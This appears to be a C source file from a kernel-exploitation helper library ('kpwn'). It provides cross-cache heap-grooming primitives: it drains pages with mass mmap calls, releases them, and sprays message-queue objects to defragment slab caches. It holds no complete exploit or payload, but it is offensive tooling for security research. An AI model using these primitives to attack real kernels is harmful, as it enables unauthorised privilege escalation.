#define _GNU_SOURCE

#include <kpwn/crosscache.h>
#include <kpwn/logger.h>
#include <kpwn/utils.h>

#include <sys/mman.h>

int kpwn_drain_pages(void **maps, size_t n_pages) {
  for (size_t i = 0; i < n_pages; i++) {
    maps[i] = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
    if (maps[i] == MAP_FAILED) {
      log_error("[kpwn:crosscache] drain mmap failed at %zu", i);
      return -1;
    }
  }
  log_debug("[kpwn:crosscache] drained %zu pages", n_pages);
  return 0;
}

int kpwn_release_pages(void **maps, size_t n_pages) {
  for (size_t i = 0; i < n_pages; i++) {
    if (maps[i] && maps[i] != MAP_FAILED)
      munmap(maps[i], 0x1000);
  }
  log_debug("[kpwn:crosscache] released %zu pages", n_pages);
  return 0;
}

int kpwn_defrag_msg(int *qids, size_t n, size_t obj_size) {
  char *buf = calloc(1, obj_size);
  ASSERT(buf != NULL);
  int ret = kpwn_spray_msg(qids, n, buf, obj_size);
  free(buf);
  log_debug("[kpwn:crosscache] defrag n=%zu obj_size=%zu", n, obj_size);
  return ret;
}
